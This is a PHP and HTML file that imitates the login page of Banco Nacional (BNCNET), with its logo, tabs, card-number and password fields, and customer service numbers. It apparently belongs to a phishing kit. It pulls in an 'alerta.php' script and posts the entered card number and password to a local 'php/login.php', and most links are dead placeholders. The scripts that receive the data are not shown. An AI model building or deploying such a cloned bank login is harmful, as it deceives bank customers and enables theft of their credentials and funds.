<?php
include 'php/alerta.php';
?>
<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login - Banco Nacional (BNCNET)</title>
  <link rel="shortcut icon" href="img/favicon.ico" type="image/x-icon">
  <link rel="stylesheet" href="css/index.css">
</head>
<body>
  <header class="header1">
    <div class="logo">
      <img src="img/logo.png" alt="" style="width: 80px; height: 70px;">
    </div>
  </header>
  <div class="wrapper">
    <form class="login-container" id="login-form" action="php/login.php" method="POST">
      <div class="tabs">
        <button type="button" id="tab-personas">Personas</button>
        <button type="button" id="tab-empresas" class="active">Empresas</button>
      </div>
      <h2>Iniciar Sesión</h2>
      <p>¡Buenas tardes, <strong>Bienvenido!</strong><br>Ingrese sus credenciales</p>

      <div class="sub-tabs" id="sub-tabs-empresas">
        <button type="button" id="btn-bncnet" class="active">BNCNET</button>
        <button type="button" id="btn-debito-juridica" class="non-active">Débito Jurídica</button>
      </div>

      <div class="form-group">
        <input name="tarjeta" id="input-tarjeta" type="text" placeholder="Número de Tarjeta" required pattern="\d*" inputmode="numeric" oninput="this.value = this.value.replace(/\D/g, '')">
      </div>
      <div class="form-group" id="group-password" style="display:none;">
        <input name="password" id="input-password" type="password" placeholder="Contraseña" required>
      </div>

      <button type="button" class="btn-primary" id="btn-continuar">Continuar</button>
      <button type="submit" class="btn-primary" id="btn-ingresar" style="display:none;">Ingresar</button>

      <div class="login-footer">
        <a href="#">¿Olvidaste tu clave?</a>
        <p>Tus datos se encuentran protegidos por nuestro certificado de seguridad digital (TLS/SSL)</p>
      </div>
    </form>

    <div class="features">
      <div class="features-header">
        <h1>EN UN CLIC</h1>
        <p>Realiza tus operaciones con seguridad, todos los días del año y desde donde te encuentres.</p>
      </div>
      <div class="grid-3">
        <div class="card">
          <img src="img/r1.png" alt="" style="display:block;margin:0 auto 10px;width:40px;height:40px;">
          <h3>Registrarte en BNCNET</h3>
          <p>Conoce el paso a paso para registrarte por primera vez en BNCNET y disfrutar las ventajas de nuestra banca en línea.</p>
          <a href="#">HAZ CLIC AQUÍ →</a>
        </div>
        <div class="card">
          <img src="img/r2.png" alt="" style="display:block;margin:0 auto 10px;width:60px;height:40px;">
          <h3>BNC en Moneda Extranjera</h3>
          <p>Te ofrecemos cuentas, tarjetas y operaciones en Moneda Extranjera. ¡Las opciones que esperabas!</p>
          <a href="#">HAZ CLIC AQUÍ →</a>
        </div>
        <div class="card">
          <img src="img/r3.png" alt="" style="display:block;margin:0 auto 10px;width:40px;height:40px;">
          <h3>Agencias BNC</h3>
          <p>Conoce la ubicación de nuestra Red de Agencias y Taquillas a nivel nacional.</p>
          <a href="#">HAZ CLIC AQUÍ →</a>
        </div>
      </div>
      <div class="wide-card">
        <span class="phone-icon">📞</span>
        <p>Centro de Atención al Cliente BNC: 24 horas, los 7 días de la semana.<br>
        Área Metropolitana (0212-597-50-00) - Interior del país 0500-BNC5000 (2625000)</p>
      </div>
    </div>
  </div>
  <script src="js/index.js"></script>
</body>
</html>
